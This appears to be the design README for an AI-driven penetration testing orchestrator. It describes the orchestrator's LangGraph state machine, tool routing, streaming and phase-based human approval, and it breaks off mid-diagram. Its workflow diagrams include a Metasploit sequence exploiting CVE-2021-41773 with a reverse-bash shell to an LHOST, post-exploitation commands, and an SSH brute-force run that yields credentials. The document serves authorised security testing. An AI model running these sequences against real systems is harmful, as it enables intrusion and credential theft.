# RedAmon Agentic System

## Overview

The **RedAmon Agentic System** is an AI-powered penetration testing orchestrator built on **LangGraph**. It implements the **ReAct (Reasoning and Acting)** pattern to autonomously conduct security assessments while maintaining human oversight through phase-based approval workflows.

---

## Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [Core Components](#core-components)
3. [LangGraph State Machine](#langgraph-state-machine)
4. [Attack Path Classification](#attack-path-classification)
5. [Tool Execution & MCP Integration](#tool-execution--mcp-integration)
6. [WebSocket Streaming](#websocket-streaming)
   - [Guidance Messages](#guidance-messages)
   - [Stop & Resume Execution](#stop--resume-execution)
7. [Frontend Integration](#frontend-integration)
8. [Detailed Workflows](#detailed-workflows)
9. [Multi-Objective Support](#multi-objective-support)
10. [Security & Multi-Tenancy](#security--multi-tenancy)

---

## Architecture Overview

```mermaid
flowchart TB
    subgraph Frontend["Frontend (Next.js Webapp)"]
        UI[AIAssistantDrawer]
        Hook[useAgentWebSocket Hook]
        Timeline[AgentTimeline]
        Dialogs[Approval/Question Dialogs]
    end

    subgraph Backend["Backend (FastAPI)"]
        WS[WebSocket API]
        REST[REST API]
        WSM[WebSocketManager]
    end

    subgraph Orchestrator["Agent Orchestrator"]
        LG[LangGraph State Machine]
        CP[MemorySaver Checkpointer]
        SC[StreamingCallback]
    end

    subgraph Tools["Tool Layer"]
        TE[PhaseAwareToolExecutor]
        MCP[MCPToolsManager]
        N4J[Neo4jToolManager]
    end

    subgraph MCPServers["MCP Servers (Docker)"]
        NAABU[Naabu Server :8000]
        CURL[Curl Server :8001]
        MSF[Metasploit Server :8003]
    end

    subgraph Data["Data Layer"]
        NEO4J[(Neo4j Graph DB)]
        KALI[Kali Sandbox Container]
    end

    UI --> Hook
    Hook <-->|WebSocket JSON| WS
    WS --> WSM
    WSM --> LG
    LG --> CP
    LG --> SC
    SC -->|Streaming Events| WSM

    LG --> TE
    TE --> MCP
    TE --> N4J

    MCP --> NAABU
    MCP --> CURL
    MCP --> MSF

    N4J --> NEO4J
    MSF --> KALI
    NAABU --> KALI
    CURL --> KALI
```

---

## Core Components

### File Structure

| File / Directory | Purpose |
|------------------|---------|
| `orchestrator.py` | Main LangGraph agent with ReAct pattern |
| `state.py` | Pydantic models and TypedDict state definitions |
| `project_settings.py` | Database-driven configuration (replaces `params.py`) |
| `tools.py` | MCP and Neo4j tool management |
| `api.py` | REST API endpoints |
| `websocket_api.py` | WebSocket streaming API |
| `utils.py` | Utility functions |
| `prompts/` | System prompts package (phase-aware, attack-path-specific) |
| `prompts/base.py` | Core ReAct, analysis, and report prompts |
| `prompts/classification.py` | Attack path classification prompt |
| `prompts/cve_exploit_prompts.py` | CVE exploitation workflow & payload guidance |
| `prompts/brute_force_credential_guess_prompts.py` | Brute force / credential attack workflow |
| `prompts/post_exploitation.py` | Post-exploitation prompts (statefull, shell, stateless) |
| `orchestrator_helpers/` | Helper modules extracted from orchestrator |
| `orchestrator_helpers/config.py` | Session config, checkpointer, thread ID management |
| `orchestrator_helpers/phase.py` | Attack path classification & phase determination |
| `orchestrator_helpers/parsing.py` | LLM response parsing (decisions & inline analysis) |
| `orchestrator_helpers/json_utils.py` | JSON serialization with datetime support |
| `orchestrator_helpers/debug.py` | Graph visualization (Mermaid PNG export) |

### Key Classes

```mermaid
classDiagram
    class AgentOrchestrator {
        +llm: ChatOpenAI
        +tool_executor: PhaseAwareToolExecutor
        +graph: StateGraph
        +_guidance_queue: asyncio.Queue
        +initialize()
        +invoke(question, user_id, project_id, session_id)
        +invoke_with_streaming(question, ..., streaming_callback, guidance_queue)
        +resume_after_approval(...)
        +resume_after_answer(...)
        +resume_after_approval_with_streaming(..., guidance_queue)
        +resume_after_answer_with_streaming(..., guidance_queue)
        +resume_execution_with_streaming(..., guidance_queue)
    }

    class PhaseAwareToolExecutor {
        +mcp_manager: MCPToolsManager
        +graph_tool: Neo4jToolManager
        +phase_tools: Dict
        +execute(tool_name, tool_args, phase)
        +execute_with_progress(tool_name, tool_args, phase, progress_callback)
        +get_tools_for_phase(phase)
    }

    class MCPToolsManager {
        +servers: List[MCPServer]
        +tools_cache: Dict
        +get_tools()
        +call_tool(tool_name, args)
    }

    class Neo4jToolManager {
        +driver: Neo4jDriver
        +llm: ChatOpenAI
        +query_graph(question, user_id, project_id)
    }

    class StreamingCallback {
        <<interface>>
        +on_thinking(iteration, phase, thought, reasoning)
        +on_tool_start(tool_name, tool_args)
        +on_tool_output_chunk(tool_name, chunk, is_final)
        +on_tool_complete(tool_name, success, output_summary, actionable_findings, recommended_next_steps)
        +on_phase_update(current_phase, iteration_count, attack_path_type)
        +on_approval_request(approval_request)
        +on_question_request(question_request)
        +on_response(answer, iteration_count, phase, task_complete)
        +on_execution_step(step)
        +on_error(error_message, recoverable)
        +on_task_complete(message, final_phase, total_iterations)
    }

    AgentOrchestrator --> PhaseAwareToolExecutor
    AgentOrchestrator --> StreamingCallback
    PhaseAwareToolExecutor --> MCPToolsManager
    PhaseAwareToolExecutor --> Neo4jToolManager
```

---

## LangGraph State Machine

### State Definition

The agent maintains comprehensive state throughout execution:

```mermaid
erDiagram
    AgentState {
        list messages "Conversation history"
        int current_iteration "Current loop iteration"
        int max_iterations "Maximum allowed iterations"
        string current_phase "informational|exploitation|post_exploitation"
        string attack_path_type "cve_exploit|brute_force_credential_guess"
        bool task_complete "Whether objective is achieved"
        string completion_reason "Why task ended"
        bool msf_session_reset_done "Metasploit auto-reset tracking"
    }

    AgentState ||--o{ ExecutionStep : execution_trace
    AgentState ||--o{ TodoItem : todo_list
    AgentState ||--o{ ConversationObjective : conversation_objectives
    AgentState ||--o{ ObjectiveOutcome : objective_history
    AgentState ||--o{ PhaseHistoryEntry : phase_history
    AgentState ||--o{ QAHistoryEntry : qa_history
    AgentState ||--|| TargetInfo : target_info
    AgentState ||--o| PhaseTransitionRequest : phase_transition_pending
    AgentState ||--o| UserQuestionRequest : pending_question

    ExecutionStep {
        string step_id "Unique step identifier"
        int iteration "Step number"
        string phase "Phase during step"
        string thought "LLM reasoning"
        string reasoning "Why this action"
        string tool_name "Tool executed"
        dict tool_args "Tool arguments"
        string tool_output "Raw tool output"
        bool success "Execution success"
        string output_analysis "LLM analysis of output"
    }

    TargetInfo {
        string primary_target "Main target IP/domain"
        string target_type "ip|hostname|domain|url"
        list ports "Discovered ports"
        list services "Detected services"
        list technologies "Identified technologies"
        list vulnerabilities "Found vulnerabilities"
        list credentials "Extracted credentials (brute force)"
        list sessions "Active Metasploit session IDs"
        dict session_details "Rich session metadata per ID"
    }

    TodoItem {
        string description "Task description"
        string status "pending|in_progress|completed|blocked"
        string priority "high|medium|low"
    }
```

### Graph Structure

```mermaid
stateDiagram-v2
    [*] --> initialize

    initialize --> process_approval: Has approval response
    initialize --> process_answer: Has question answer
    initialize --> think: Normal flow

    think --> execute_tool: action=use_tool
    think --> await_approval: action=transition_phase (needs approval)
    think --> await_question: action=ask_user
    think --> generate_response: action=complete OR max_iterations

    execute_tool --> think: Output analyzed inline in next think

    await_approval --> [*]: Pauses for user input

    process_approval --> think: Approved or modified
    process_approval --> generate_response: Aborted

    await_question --> [*]: Pauses for user input

    process_answer --> think: Continue with answer
    process_answer --> generate_response: If task complete

    generate_response --> [*]
```

### Node Responsibilities

```mermaid
flowchart LR
    subgraph Nodes["LangGraph Nodes"]
        direction TB
        INIT[initialize]
        THINK[think]
        EXEC[execute_tool]
        AWAIT_A[await_approval]
        PROC_A[process_approval]
        AWAIT_Q[await_question]
        PROC_Q[process_answer]
        GEN[generate_response]
    end

    subgraph InitDesc["Initialize Node"]
        I1[Setup state for new session]
        I2[Detect multi-objective scenarios]
        I3[Classify attack path via LLM]
        I4[Route approval/answer resumption]
        I5[Migrate legacy state]
    end

    subgraph ThinkDesc["Think Node - Single LLM Call"]
        T1[Build system prompt with attack-path-specific tools]
        T2[If pending tool output: inject output analysis section]
        T3[Format execution trace with objective grouping]
        T4[Get LLM decision JSON with inline output_analysis]
        T5[Parse action: use_tool/transition_phase/complete/ask_user]
        T6[Process output_analysis: merge target info, detect exploits]
        T7[Update todo list]
        T8[Pre-exploitation validation: force ask_user if LHOST/LPORT missing]
    end

    subgraph ExecDesc["Execute Tool Node"]
        E1[Validate tool for current phase]
        E2[Set tenant context]
        E3[Auto-reset Metasploit on first use via msf_restart]
        E4[Execute via MCP or Neo4j]
        E5[Stream progress for long-running MSF commands]
        E6[Capture output and errors]
    end

    subgraph GenDesc["Generate Response Node - LLM Call #2"]
        G1[Build final report prompt]
        G2[Summarize session findings]
        G3[Mark task complete]
    end

    INIT -.-> InitDesc
    THINK -.-> ThinkDesc
    EXEC -.-> ExecDesc
    GEN -.-> GenDesc
```

---

## Attack Path Classification

When a new objective is detected, the system uses an LLM-based classifier to determine the **attack path type** and **required phase** before execution begins. This drives dynamic tool routing throughout the session.

### Attack Path Types

| Type | Description | Example Objective |
|------|-------------|-------------------|
| `cve_exploit` | CVE-based exploitation using known vulnerabilities | "Exploit CVE-2021-41773 on 192.168.1.100" |
| `brute_force_credential_guess` | Brute force / credential attacks against services | "Try SSH brute force on 192.168.1.100" |

### Classification Flow

```mermaid
flowchart TB
    MSG[New user objective arrives] --> CLASSIFY[LLM classifies objective]

    CLASSIFY --> RESULT{AttackPathClassification}

    RESULT --> CVE[cve_exploit]
    RESULT --> BRUTE[brute_force_credential_guess]

    CVE --> CVE_TOOLS[CVE Exploit Tools<br/>search → use → info → set → exploit]
    CVE --> CVE_PAYLOAD{Payload Mode}
    CVE_PAYLOAD --> STATEFULL_CVE[Statefull: Meterpreter/Staged payloads<br/>+ LHOST/LPORT config]
    CVE_PAYLOAD --> STATELESS_CVE[Stateless: Command/Exec payloads]

    BRUTE --> BRUTE_TOOLS[Brute Force Tools<br/>use auxiliary/scanner → set → run]
    BRUTE --> BRUTE_POST[Post-Expl: Shell session<br/>via CreateSession=true]

    style CVE fill:#FFD700
    style BRUTE fill:#FF6B6B
    style CLASSIFY fill:#87CEEB
```

### Classification Model

```python
class AttackPathClassification(BaseModel):
    required_phase: Phase           # "informational" or "exploitation"
    attack_path_type: AttackPathType  # "cve_exploit" or "brute_force_credential_guess"
    confidence: float               # 0.0-1.0 confidence score
    reasoning: str                  # Explanation for the classification
    detected_service: Optional[str] # e.g., "ssh", "mysql" (for brute force)
```

The classifier runs with retry logic (exponential backoff, max 3 retries) and falls back to `("cve_exploit", "informational")` on failure.

### Dynamic Tool Routing

Based on the classified attack path, `get_phase_tools()` assembles different prompt guidance:

| Phase | CVE Exploit Path | Brute Force Path |
|-------|-----------------|------------------|
| **Informational** | Standard recon tools | Standard recon tools |
| **Exploitation** | `CVE_EXPLOIT_TOOLS` + payload guidance (statefull/stateless) | `BRUTE_FORCE_CREDENTIAL_GUESS_TOOLS` + wordlist guidance |
| **Post-Exploitation** | `POST_EXPLOITATION_TOOLS_STATEFULL` (Meterpreter) | `POST_EXPLOITATION_TOOLS_SHELL` (SSH shell session) |

### Pre-Exploitation Validation

Before executing Metasploit commands in **statefull CVE exploit** mode, the system validates session configuration:

```mermaid
flowchart TB
    THINK[Think Node decides: use metasploit_console] --> CHECK{Statefull mode +<br/>CVE exploit path?}

    CHECK -->|No| EXEC[Execute tool normally]
    CHECK -->|Yes| VALIDATE{LHOST/LPORT<br/>configured?}

    VALIDATE -->|Yes| EXEC
    VALIDATE -->|No| QA_CHECK{Already answered<br/>in qa_history?}

    QA_CHECK -->|Yes| EXEC
    QA_CHECK -->|No| FORCE_ASK[Force ask_user action<br/>Request LHOST/LPORT from user]

    FORCE_ASK --> PAUSE([Pause for user answer])
    PAUSE --> THINK

    style FORCE_ASK fill:#FFD700
    style PAUSE fill:#FFD700
```

This prevents exploitation failures by ensuring reverse/bind payload parameters are available before the agent attempts to run Metasploit exploits. Brute force attacks bypass this check since they create direct shell sessions without needing LHOST/LPORT.

### Credential Detection

During brute force attacks, the think node's inline output analysis automatically extracts discovered credentials:

```mermaid
flowchart LR
    OUTPUT[Tool output from<br/>auxiliary/scanner module] --> ANALYSIS[Think node inline analysis<br/>LLM extracts credentials]

    ANALYSIS --> FOUND{Credentials found?}
    FOUND -->|Yes| MERGE[Merge into TargetInfo.credentials]
    FOUND -->|No| SKIP[No update]

    MERGE --> TARGET[Updated target_info<br/>available in state]
```

---

## Tool Execution & MCP Integration

### Phase-Based Tool Access

```mermaid
flowchart TB
    subgraph Phases["Security Phases"]
        INFO[Informational Phase]
        EXPL[Exploitation Phase]
        POST[Post-Exploitation Phase]
    end

    subgraph InfoTools["Informational Tools"]
        QG[query_graph<br/>Neo4j queries]
        CURL[execute_curl<br/>HTTP requests]
        NAABU[execute_naabu<br/>Port scanning]
    end

    subgraph ExplTools["Exploitation Tools"]
        MSF[metasploit_console<br/>msfconsole commands]
    end

    subgraph PostTools["Post-Exploitation Tools"]
        SESS[msf_session_run<br/>Session commands]
        WAIT[msf_wait_for_session<br/>Session polling]
        LIST[msf_list_sessions<br/>List active sessions]
    end

    INFO --> InfoTools
    EXPL --> InfoTools
    EXPL --> ExplTools
    POST --> InfoTools
    POST --> ExplTools
    POST --> PostTools

    style INFO fill:#90EE90
    style EXPL fill:#FFD700
    style POST fill:#FF6B6B
```

### MCP Tool Execution Flow

```mermaid
sequenceDiagram
    participant O as Orchestrator
    participant TE as ToolExecutor
    participant MCP as MCPToolsManager
    participant S as MCP Server
    participant K as Kali Container

    O->>TE: execute("naabu", {target: "192.168.1.1"}, "informational")
    TE->>TE: Validate phase allows tool
    TE->>TE: set_tenant_context(user_id, project_id)
    TE->>MCP: call_tool("naabu", args)
    MCP->>S: HTTP POST /tools/naabu
    S->>K: Execute naabu command
    K-->>S: Port scan results
    S-->>MCP: JSON response
    MCP-->>TE: Formatted output
    TE-->>O: {success: true, output: "..."}
```

### Neo4j Query Flow (Text-to-Cypher)

```mermaid
sequenceDiagram
    participant O as Orchestrator
    participant N4J as Neo4jToolManager
    participant LLM as OpenAI LLM
    participant DB as Neo4j Database

    O->>N4J: query_graph("What ports are open on 192.168.1.1?")
    N4J->>LLM: Generate Cypher from question
    LLM-->>N4J: MATCH (i:IP {address: '192.168.1.1'})-[:HAS_PORT]->(p:Port) RETURN p
    N4J->>N4J: Inject tenant filter (user_id, project_id)
    N4J->>DB: Execute Cypher query

    alt Query Success
        DB-->>N4J: Query results
        N4J-->>O: Formatted results
    else Query Error
        DB-->>N4J: Error message
        N4J->>LLM: Retry with error context
        LLM-->>N4J: Fixed Cypher query
        N4J->>DB: Execute fixed query
        DB-->>N4J: Results
        N4J-->>O: Formatted results
    end
```

### Metasploit Stateful Execution

```mermaid
flowchart TB
    subgraph MSFServer["Metasploit MCP Server"]
        PROC[Persistent msfconsole Process]
        READER[Background Output Reader Thread]
        QUEUE[Output Queue Buffer]
    end

    subgraph Commands["One Command Per Call"]
        C1["search CVE-2021-41773"]
        C2["use exploit/multi/http/..."]
        C3["info"]
        C4["show targets"]
        C5["set TARGET 0"]
        C6["show payloads"]
        C7["set PAYLOAD cmd/unix/reverse_bash"]
        C8["set RHOSTS 192.168.1.100"]
        C9["exploit"]
        C10["msf_wait_for_session()"]
    end

    C1 --> PROC
    C2 --> PROC
    C3 --> PROC
    C4 --> PROC
    C5 --> PROC
    C6 --> PROC
    C7 --> PROC
    C8 --> PROC
    C9 --> PROC

    PROC --> READER
    READER --> QUEUE
    QUEUE --> |Timing-based detection| OUTPUT[Clean Output]

    C10 --> |Separate MCP tool| POLL[Poll for sessions]
    POLL --> |sessions -l| PROC

    style PROC fill:#FF6B6B
    style C10 fill:#FFD700
```

---

## WebSocket Streaming

### Message Protocol

```mermaid
flowchart LR
    subgraph Client["Client → Server"]
        INIT[init<br/>{user_id, project_id, session_id}]
        QUERY[query<br/>{question}]
        APPROVAL[approval<br/>{decision, modification}]
        ANSWER[answer<br/>{answer}]
        GUIDANCE[guidance<br/>{message}]
        STOP[stop<br/>{}]
        RESUME[resume<br/>{}]
        PING[ping<br/>{}]
    end

    subgraph Server["Server → Client"]
        CONNECTED[connected]
        THINKING[thinking<br/>{iteration, phase, thought, reasoning}]
        TOOL_START[tool_start<br/>{tool_name, tool_args}]
        TOOL_CHUNK[tool_output_chunk<br/>{tool_name, chunk, is_final}]
        TOOL_COMPLETE[tool_complete<br/>{tool_name, success, output_summary,<br/>actionable_findings, recommended_next_steps}]
        PHASE_UPDATE[phase_update<br/>{current_phase, iteration_count, attack_path_type}]
        TODO_UPDATE[todo_update<br/>{todo_list}]
        APPROVAL_REQ[approval_request<br/>{from_phase, to_phase, reason, risks}]
        QUESTION_REQ[question_request<br/>{question, context, format, options}]
        RESPONSE[response<br/>{answer, task_complete}]
        EXEC_STEP[execution_step<br/>{step summary}]
        TASK_DONE[task_complete<br/>{message, final_phase}]
        GUIDANCE_ACK[guidance_ack<br/>{message, queue_position}]
        STOPPED[stopped<br/>{message, iteration, phase}]
        ERROR[error<br/>{message, recoverable}]
    end
```

### Streaming Event Flow

The think node emits events in a specific order to maintain correct timeline rendering in the frontend. When the think node processes both a completed previous step and a new decision, events are emitted as: `tool_complete` (previous) -> `thinking` (new) -> `tool_start` (new).

```mermaid
sequenceDiagram
    participant C as Client (Browser)
    participant WS as WebSocket API
    participant O as Orchestrator
    participant CB as StreamingCallback

    C->>WS: init {user_id, project_id, session_id}
    WS-->>C: connected

    C->>WS: query {question: "Scan ports on 192.168.1.1"}
    WS->>O: invoke_with_streaming(question, callback)

    Note over O,CB: First iteration (no pending output)
    O->>CB: on_phase_update("informational", 1, "cve_exploit")
    CB-->>WS-->>C: phase_update

    O->>CB: on_thinking(1, "informational", "Need to scan...", "Port scan required")
    CB-->>WS-->>C: thinking

    O->>CB: on_tool_start("naabu", {target: "192.168.1.1"})
    CB-->>WS-->>C: tool_start

    Note over O: Tool executes...
    O->>CB: on_tool_output_chunk("naabu", "22/tcp open\n80/tcp open", true)
    CB-->>WS-->>C: tool_output_chunk

    Note over O,CB: Second iteration (pending output from naabu)
    O->>CB: on_tool_complete("naabu", true, "Found 2 open ports")
    CB-->>WS-->>C: tool_complete (previous step)

    O->>CB: on_thinking(2, "informational", "Found open ports...", "Query graph next")
    CB-->>WS-->>C: thinking (new decision)

    O->>CB: on_tool_start("query_graph", {question: "..."})
    CB-->>WS-->>C: tool_start (new tool)

    O->>CB: on_todo_update([{description: "Analyze services", status: "pending"}])
    CB-->>WS-->>C: todo_update

    Note over O: ... continues until complete ...

    O->>CB: on_response("Scan complete. Found ports 22, 80.", 3, "informational", true)
    CB-->>WS-->>C: response

    O->>CB: on_task_complete("Task completed", "informational", 3)
    CB-->>WS-->>C: task_complete
```

### Guidance Messages

Users can send **guidance messages** while the agent is working (thinking or executing tools). These messages steer/correct the agent's current objective without creating new tasks.

```mermaid
sequenceDiagram
    participant U as User (Frontend)
    participant WS as WebSocket API
    participant Q as Connection.guidance_queue
    participant O as Orchestrator (_think_node)

    Note over O: Agent is working (think → execute → think loop)

    U->>WS: guidance {message: "Focus on port 22"}
    WS->>Q: guidance_queue.put("Focus on port 22")
    WS-->>U: guidance_ack {message, queue_position: 1}

    U->>WS: guidance {message: "Skip the web server"}
    WS->>Q: guidance_queue.put("Skip the web server")
    WS-->>U: guidance_ack {message, queue_position: 2}

    Note over O: Next think node runs...
    O->>Q: drain_guidance() → ["Focus on port 22", "Skip the web server"]
    O->>O: Inject into system prompt as<br/>## USER GUIDANCE (IMPORTANT)
    O->>O: LLM acknowledges guidance in thought
```

**How it works:**

1. **Frontend**: When `isLoading=true`, the chat input stays enabled. Sending a message routes to `sendGuidance()` instead of `sendQuery()`.
2. **WebSocket API**: `handle_guidance` puts the message into the connection's `asyncio.Queue` and sends back a `guidance_ack` with the queue position.
3. **Orchestrator**: At the start of each `_think_node` invocation, pending guidance messages are drained from the queue and injected into the system prompt as a numbered `## USER GUIDANCE` section.
4. **LLM**: The agent sees the guidance and adjusts its plan accordingly in the next decision.

**Edge cases:**
- Multiple guidance messages before the next think step are all collected and injected as a numbered list
- Guidance sent during tool execution is queued and consumed in the next think step
- Stale guidance from previous queries is drained at the start of each new `handle_query`

### Stop & Resume Execution

Users can **stop** the agent mid-execution and **resume** from the last LangGraph checkpoint.

```mermaid
sequenceDiagram
    participant U as User (Frontend)
    participant WS as WebSocket API
    participant T as asyncio.Task
    participant CP as MemorySaver Checkpoint

    Note over T: Agent task running (background asyncio.Task)

    U->>WS: stop {}
    WS->>T: task.cancel()
    T->>T: CancelledError raised
    Note over CP: State checkpointed at last node boundary
    WS->>WS: Read iteration/phase from checkpoint
    WS-->>U: stopped {message, iteration: 5, phase: "exploitation"}

    Note over U: UI shows resume button (green play icon)

    U->>WS: resume {}
    WS->>WS: Create new background task
    WS->>T: orchestrator.resume_execution_with_streaming()
    T->>CP: graph.astream({}, config) — resume from checkpoint
    Note over T: Agent continues from last node boundary

    T-->>WS-->>U: thinking, tool_start, ... (normal streaming)
```

**How it works:**

1. **Background tasks**: All orchestrator invocations (`handle_query`, `handle_approval`, `handle_answer`) run as `asyncio.create_task()` background tasks, keeping the WebSocket receive loop free for guidance/stop/resume messages.
2. **Stop**: Cancels the active `asyncio.Task`. The `CancelledError` is caught gracefully. LangGraph's `MemorySaver` has already checkpointed state at the last node boundary.
3. **Resume**: Calls `resume_execution_with_streaming()` which re-invokes `graph.astream({}, config)` with empty input. The graph resumes from the checkpoint, re-entering `initialize → think` with the preserved state.
4. **Frontend**: The stop button (red square) appears during loading. After stop, it becomes a resume button (green play). The input is disabled while stopped.

---

## Frontend Integration

### useAgentWebSocket Hook

```mermaid
stateDiagram-v2
    [*] --> DISCONNECTED

    DISCONNECTED --> CONNECTING: connect()

    CONNECTING --> CONNECTED: WebSocket open + init success
    CONNECTING --> FAILED: Connection error

    CONNECTED --> RECONNECTING: WebSocket close/error
    CONNECTED --> DISCONNECTED: disconnect()

    RECONNECTING --> CONNECTING: Retry attempt
    RECONNECTING --> FAILED: Max retries exceeded

    FAILED --> CONNECTING: reconnect()
```

### UI State Management

```mermaid
flowchart TB
    subgraph State["AIAssistantDrawer State"]
        ITEMS[chatItems: Array]
        PHASE[currentPhase: string]
        LOADING[isLoading: boolean]
        STOPPED[isStopped: boolean]
        AWAIT_A[awaitingApproval: boolean]
        AWAIT_Q[awaitingQuestion: boolean]
        TODO[todoList: Array]
    end

    subgraph Events["WebSocket Events"]
        E_THINK[thinking]
        E_TOOL[tool_start/complete]
        E_PHASE[phase_update]
        E_TODO[todo_update]
        E_APPR[approval_request]
        E_QUES[question_request]
        E_RESP[response]
        E_GACK[guidance_ack]
        E_STOP[stopped]
    end

    subgraph UI["UI Components"]
        TIMELINE[AgentTimeline]
        DIALOG_A[ApprovalDialog]
        DIALOG_Q[QuestionDialog]
        TODO_W[TodoListWidget]
        CHAT[ChatMessages]
        STOP_BTN[Stop/Resume Button]
        GUIDANCE_INPUT[Guidance Input<br/>enabled during loading]
    end

    E_THINK --> |Add ThinkingItem| ITEMS
    E_TOOL --> |Add ToolExecutionItem| ITEMS
    E_RESP --> |Add MessageItem| ITEMS
    E_PHASE --> PHASE
    E_TODO --> TODO
    E_APPR --> AWAIT_A
    E_QUES --> AWAIT_Q
    E_STOP --> STOPPED

    ITEMS --> TIMELINE
    ITEMS --> CHAT
    AWAIT_A --> DIALOG_A
    AWAIT_Q --> DIALOG_Q
    TODO --> TODO_W
    PHASE --> |Phase badge styling| TIMELINE
    LOADING --> STOP_BTN
    STOPPED --> STOP_BTN
    LOADING --> GUIDANCE_INPUT
```

### Input Mode Behavior

The chat input adapts based on agent state:

| State | Input Enabled | Send Action | Placeholder | Extra Button |
|-------|--------------|-------------|-------------|--------------|
| **Idle** | Yes | `sendQuery()` | "Ask a question..." | None |
| **Loading** (agent working) | Yes | `sendGuidance()` | "Send guidance to the agent..." | Stop (red square) |
| **Stopped** | No | — | "Agent stopped. Click resume..." | Resume (green play) |
| **Awaiting approval** | No | — | "Respond to the approval request..." | None |
| **Awaiting question** | No | — | "Answer the question above..." | None |
| **Disconnected** | No | — | "Connecting to agent..." | None |

Guidance messages appear in the chat with a purple "Guidance" badge and dashed border styling to distinguish them from regular user messages.

---

## Detailed Workflows

### Complete Agent Execution Flow

```mermaid
flowchart TB
    START([User sends question]) --> INIT[Initialize Node]

    INIT --> CHECK_RESUME{Resuming after<br/>approval/answer?}
    CHECK_RESUME -->|Yes, approval| PROC_A[Process Approval]
    CHECK_RESUME -->|Yes, answer| PROC_Q[Process Answer]
    CHECK_RESUME -->|No| NEW_OBJ{New objective?}

    NEW_OBJ -->|Yes| CLASSIFY[LLM classifies attack path<br/>+ required phase]
    NEW_OBJ -->|No| THINK[Think Node]
    CLASSIFY --> THINK

    PROC_A --> THINK
    PROC_Q --> THINK

    THINK --> PRE_VALID{Pre-exploitation<br/>validation}
    PRE_VALID -->|Missing LHOST/LPORT| FORCE_ASK[Force ask_user]
    PRE_VALID -->|OK| DECISION{Action?}
    FORCE_ASK --> AWAIT_Q

    DECISION -->|use_tool| EXEC[Execute Tool]
    DECISION -->|transition_phase| PHASE_CHECK{Needs approval?}
    DECISION -->|ask_user| AWAIT_Q[Await Question]
    DECISION -->|complete| GEN[Generate Response]

    EXEC --> THINK_AGAIN[Think Node<br/>analyzes output inline + decides next]
    THINK_AGAIN --> ITER_CHECK{Max iterations?}
    ITER_CHECK -->|No| PRE_VALID
    ITER_CHECK -->|Yes| GEN

    PHASE_CHECK -->|Yes| AWAIT_A[Await Approval]
    PHASE_CHECK -->|No, auto-approve| UPDATE_PHASE[Update Phase]
    UPDATE_PHASE --> THINK

    AWAIT_A --> PAUSE_A([Pause - Wait for user])
    PAUSE_A --> |User responds| PROC_A

    AWAIT_Q --> PAUSE_Q([Pause - Wait for user])
    PAUSE_Q --> |User answers| PROC_Q

    GEN --> END([Return response])

    style START fill:#90EE90
    style END fill:#90EE90
    style PAUSE_A fill:#FFD700
    style PAUSE_Q fill:#FFD700
    style CLASSIFY fill:#DDA0DD
    style THINK fill:#87CEEB
    style THINK_AGAIN fill:#87CEEB
    style GEN fill:#87CEEB
```

### Phase Transition Approval Flow

```mermaid
sequenceDiagram
    participant A as Agent (Think Node)
    participant O as Orchestrator
    participant WS as WebSocket
    participant U as User (Frontend)

    A->>O: Decision: transition_phase to "exploitation"
    O->>O: Check REQUIRE_APPROVAL_FOR_EXPLOITATION

    alt Approval Required
        O->>O: Store phase_transition_pending
        O->>O: Set awaiting_user_approval = true
        O->>WS: Send approval_request message
        WS->>U: Display approval dialog

        Note over O,U: Graph pauses at await_approval node (END)

        U->>WS: User decision (approve/modify/abort)
        WS->>O: Resume with user_approval_response

        alt User Approved
            O->>O: Update current_phase = "exploitation"
            O->>O: Add to phase_history
            O->>O: Clear approval state
            O->>A: Continue in new phase
        else User Modified
            O->>O: Add modification to messages
            O->>O: Clear approval state
            O->>A: Continue with modification context
        else User Aborted
            O->>O: Set task_complete = true
            O->>O: Generate final response
        end
    else Auto-Approve (downgrade to informational)
        O->>O: Update current_phase immediately
        O->>A: Continue in new phase
    end
```

### Exploitation Workflow: CVE Exploit Path

```mermaid
sequenceDiagram
    participant U as User
    participant A as Agent
    participant MSF as Metasploit Server
    participant T as Target

    U->>A: "Exploit CVE-2021-41773 on 192.168.1.100"

    Note over A: Initialize: LLM classifies → cve_exploit
    Note over A: Phase: Informational
    A->>A: Query graph for target info
    A->>A: Request phase transition to exploitation

    U->>A: Approve transition

    Note over A: Phase: Exploitation (cve_exploit path)
    Note over A: Pre-exploitation: validate LHOST/LPORT

    A->>MSF: search CVE-2021-41773
    MSF-->>A: exploit/multi/http/apache_normalize_path_rce

    A->>MSF: use exploit/multi/http/apache_normalize_path_rce
    MSF-->>A: Module loaded

    A->>MSF: info
    MSF-->>A: Module options and description

    A->>MSF: show targets
    MSF-->>A: 0: Unix Command, 1: Linux Dropper

    A->>MSF: set TARGET 0
    MSF-->>A: TARGET => 0

    A->>MSF: show payloads
    MSF-->>A: Compatible payloads list

    A->>MSF: set PAYLOAD cmd/unix/reverse_bash
    MSF-->>A: PAYLOAD => cmd/unix/reverse_bash

    A->>MSF: set RHOSTS 192.168.1.100
    MSF-->>A: RHOSTS => 192.168.1.100

    A->>MSF: set LHOST 192.168.1.50
    MSF-->>A: LHOST => 192.168.1.50

    A->>MSF: exploit
    MSF->>T: Send exploit payload
    T-->>MSF: Reverse shell connects
    MSF-->>A: "Sending stage..." (streamed via progress chunks)

    Note over A: Session detected via inline output analysis
    A->>MSF: msf_wait_for_session(timeout=120)
    MSF-->>A: Session 1 opened

    A->>A: Request phase transition to post_exploitation
    U->>A: Approve transition

    Note over A: Phase: Post-Exploitation (Meterpreter)
    A->>MSF: msf_session_run(1, "whoami")
    MSF->>T: Execute command in session
    T-->>MSF: "www-data"
    MSF-->>A: Command output
```

### Exploitation Workflow: Brute Force Path

```mermaid
sequenceDiagram
    participant U as User
    participant A as Agent
    participant MSF as Metasploit Server
    participant T as Target

    U->>A: "Try SSH brute force on 192.168.1.100"

    Note over A: Initialize: LLM classifies → brute_force_credential_guess
    Note over A: Phase: Informational
    A->>A: Query graph for target info (ports, services)
    A->>A: Request phase transition to exploitation

    U->>A: Approve transition

    Note over A: Phase: Exploitation (brute_force path)
    Note over A: No LHOST/LPORT needed (direct shell)

    A->>MSF: use auxiliary/scanner/ssh/ssh_login
    MSF-->>A: Module loaded

    A->>MSF: set RHOSTS 192.168.1.100
    MSF-->>A: RHOSTS => 192.168.1.100

    A->>MSF: set USER_FILE /usr/share/wordlists/...
    MSF-->>A: USER_FILE set

    A->>MSF: set PASS_FILE /usr/share/wordlists/...
    MSF-->>A: PASS_FILE set

    A->>MSF: set CreateSession true
    MSF-->>A: CreateSession => true

    A->>MSF: run
    MSF->>T: Try credentials
    T-->>MSF: [+] Success: 'admin:password123'
